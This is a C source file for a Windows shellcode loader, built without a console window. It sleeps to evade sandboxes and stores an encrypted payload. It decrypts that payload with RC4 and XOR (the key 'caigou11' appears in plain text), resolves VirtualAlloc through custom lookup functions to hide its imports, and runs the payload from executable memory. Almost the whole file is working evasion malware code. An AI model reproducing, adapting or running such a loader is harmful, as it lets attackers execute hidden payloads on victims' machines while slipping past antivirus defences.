#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )   

#include"UserDefineApi.h"


typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);


int main() {

	srand(unsigned int(__TIME__));
    __alt_sleepms(SLEEPTIME * 12);
    
	//这里对shellcode做了RC4和异或
	unsigned char key[] = { 'c', 'a', 'i', 'g', 'o', 'u', '1', '1' };
	unsigned char shellcode[] = "1111111\x57\x7a\x6b\xd3\x9b\x55\x35\x0f\xbd\xdf\x29\x28\x76\xfe\xff\x3e\x78\xb7\xf2\xce\x14\x80\xac\xde\x9c\x26\x5c\xfc\x79\x50\x5a\x1a\xe9\x58\x5b\x6e\x2d\x26\x9b\x0e\x4d\xda\x9a\xec\x96\xc4\xd8\x8d\x15\xb6\xbb\x84\xdd\xbd\x9b\x7e\xa0\x0d\x83\x4a\x0b\xc2\xbd\xa1\xe8\x11\x55\xea\x62\x0d\x49\xd5\x6e\x15\x4a\xd3\x7e\x44\x66\xeb\x25\x0e\x96\xaa\x45\x54\x94\xa1\x35\x0d\x3d\xca\xb6\x1f\x0e\x04\xef\x07\xea\x34\x05\xd8\x2a\xea\x79\x44\xf0\xcb\xf0\x9e\x27\xb4\x11\x18\x39\x21\xeb\x12\x56\x02\x78\xe0\x83\x3a\x19\x4a\xdf\xad\xe3\x3b\x97\x98\xf2\xe9\x75\x16\xf2\xad\xb6\x1f\xee\x2f\xe7\xec\x8a\x82\x64\xea\xab\x10\x56\x7e\xc2\xff\x19\x58\x87\x69\xf8\xe4\x70\xcc\x04\x28\x9a\xa0\x13\x1a\x4d\x73\x20\x4e\xf7\x37\xac\x9e\xaa\x76\xbe\x93\xf1\x49\xc4\x88\xc7\xfb\x64\xcd\x2b\x7f\xec\xf8\x68\xaa\x4e\xd6\x10\xc4\xe9\x3e\x29\x9a\x66\x6e\xe6\x95\x6d\xaf\x61\xbd\x06\x25\xbc\xc1\xce\xb2\x5c\xbe\x57\x0f\x15\x4c\x2f\x41\xb6\x88\xf5\x27\xa0\xda\x64\xa8\x31\xcc\xbd\xba\xd9\x63\x68\x65\xea\x7f\xb2\x8a\xe3\xd7\x83\x30\x53\xc3\x3c\x11\x03\xf8\x8d\xef\x84\xb9\x01\x63\x59\x0e\x1b\xd8\x57\x5b\xcf\xfd\xa8\x30\x73\xaf\x90\x31\xf6\x05\x78\x55\x90\x5e\x17\x43\x69\x85\xb8\xab\xee\xa1\xab\x79\xc6\x6d\x94\x20\x52\xd7\x60\xab\x50\xac\x29\xc2\x9c\x73\xfd\x17\x68\x86\x75\x38\xeb\xce\xdd\x24\x0f\x54\x38\x4a\x29\x89\x45\xa0\xdc\x39\x35\xba\xa2\x86\xcb\xd2\x93\xe7\x92\x6b\x60\x09\xb3\xbf\x6c\x0b\xe7\x42\x0b\xbb\x6a\x10\x27\x0e\x95\x87\xcf\x5a\x2f\x72\xbf\x45\x4a\xef\xc5\x10\x17\xa2\xd2\xa2\x69\x59\x76\xd9\x34\x87\xab\x95\x27\x4f\x35\x51\xec\xc3\x42\x73\x13\x01\x88\xba\x89\x76\xe1\xdc\xef\xd1\xd9\x78\x16\x2c\x57\x07\xc7\xe9\xf1\x59\x0a\x62\xa8\xbf\xbe\x6f\x10\xc0\xad\x63\x59\xe6\x1c\xb9\xf0\x89\xb2\xd6\x56\x8d\x5b\xb8\xf6\x0e\x8b\xa2\x01\x15\x3a\xe7\x0d\xf7\xe6\x3b\x17\x92\xdf\xab\xd3\x2d\x56\xcc\xb3\x69\x55\xd5\xc9\xbb\x68\x81\x07\x67\x45\xb0\x64\x20\x3a\x5c\x31\xaf\x2f\x80\x90\xf8\xd0\x78\x91\x2f\x30\xb5\xc2\x72\xbe\x76\x7b\xe7\xac\xd8\xd7\x0f\x00\x1d\x1e\x4c\xd5\xe8\x12\x76\xd4\xbb\xe2\x10\xe3\x7b\xa4\x81\x87\xf3\x73\xf3\x30\xed\x54\x47\x50\xc5\xb6\x7a\x86\xfa\xff\xde\x3b\xd5\x00\x94\xcd\x42\x1a\x66\x72\xfd\xfa\x56\x00\x3f\xb8\x36\xff\x7d\x57\x21\x76\x29\x2c\x07\x21\xcd\x2b\x49\x9e\x45\x71\x02\x58\x9f\x55\x3c\x04\x71\x3b\x8d\x48\x6f\x1b\x33\x49\x42\xc0\xab\x5d\x8c\xe5\x58\x79\xe0\xd6\xe6\x06\xe8\x90\x13\x13\x8e\x66\x23\x7e\xb3\xc0\x1d\x05\xe1\x06\x43\x12\xe7\xca\xae\x08\xa7\xbc\xb9\x1b\x89\x04\xb8\xd3\x1a\x92\x84\x1b\xa8\x80\xb6\x6a\x16\xa1\x3f\x17\x72\xd1\xfc\x3b\xe2\x48\xdb\x35\xef\xad\x16\x4f\x39\xf9\x53\xe2\xc9\x94\xdd\x36\xef\x50\x2e\xdb\xb7\xbc\x51\x8e\x1a\x4b\x66\xb5\xfa\x31\x8e\xa8\x3a\x71\xeb\x8e\x24\x43\x33\xc5\x7f\x34\x9e\xd9\xf4\x36\xcd\xb6\x1d\x2a\x46\x5b\xa4\x38\x7f\x1b\x2e\x13\x9f\x18\xf3\x0a\xab\x44\xc7\x77\x20\xc3\x7d\x85\xc5\xb9\x22\x44\x35\xbf\x16\x50\xf4\x87\xb0\x42\x8b\xf2\x91\xdd\xe1\x6e\x3b\x93\x1b\xba\x5d\xa0\xb3\xb7\xb1\xf5\x2a\x4c\x80\x90\xd8\x89\x9f\xe7\x89\x40\x49\x51\x8b\x58\x43\x3f\x4f\x8c\xe1\x15\x6a\x7b\x98\x4e\xf1\x6d\xc3\xf3\x6a\xd1\x1d\xd9\x2d\x42\xad\xa6\xb3\x23\xa2\xfb\x09\x4e\x1b\x73\x63\x4a\x6a\x32\x7f\x6e\x67\x55\x06\x55\x44\xe8\x9c\x8c\x42\xe1\x13\xe5\xc8\x89\x2c\x45\x1a\x70\xf3\x2d\x84\xd3\x9b\x91\xf6\x00\xca\x85\x2c\x0b\xed\x42\x02\x58\x84\x86\xed\x87\xd4\x11\x9d\xa2\x13\x87\x51\x95\x53\xcb\x81\xf1\xf0\x8d\xf1\x0a\x85\x35\x78\x1a\x3c\x8d\x5f\xe1\x07\xc0\x11\xfc\x37\x99\x7e\x30\x73\x9f\xe4\x11\xc3\x3a\x4d\x73\x20\xdd\x9f\x4e\x3e\x44\xa8\xb8\x55\xdf\xf7\xa7\xc9\xd1\x9a\x95\x83\x7d\x73\x0a\xd5\xc8\x8f\xc3\x97\x26\x7c\x91\x41\x9f\x85\xac\x0c\x19\xcc\xfb\x17\xed\x75\xdc\x2b\x7b\x61\x3f\xe8\x93\xe4\xbf\xd7\xe6\x8e\x66\x1d\xa9\x92";
	size_t originalLenth = sizeof(shellcode) - 1;
	memmove(shellcode, shellcode + 7, originalLenth-6);

	struct rc4_state* s;
	s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

	rc4_setup(s, key, sizeof(key) - 1);

	rc4_crypt(s, shellcode, sizeof(shellcode) - 1);
	free(s);

	for (int i = 0;i<sizeof(shellcode);i++ ){
		shellcode[i] ^= 0xcb;
	}

	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)MyGetProcAddress(MyGetModuleHandle(L"kernel32.dll"), "VirtualAlloc");

	LPVOID Memory = fnVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, sizeof(shellcode));
	((void(*)())Memory)();

}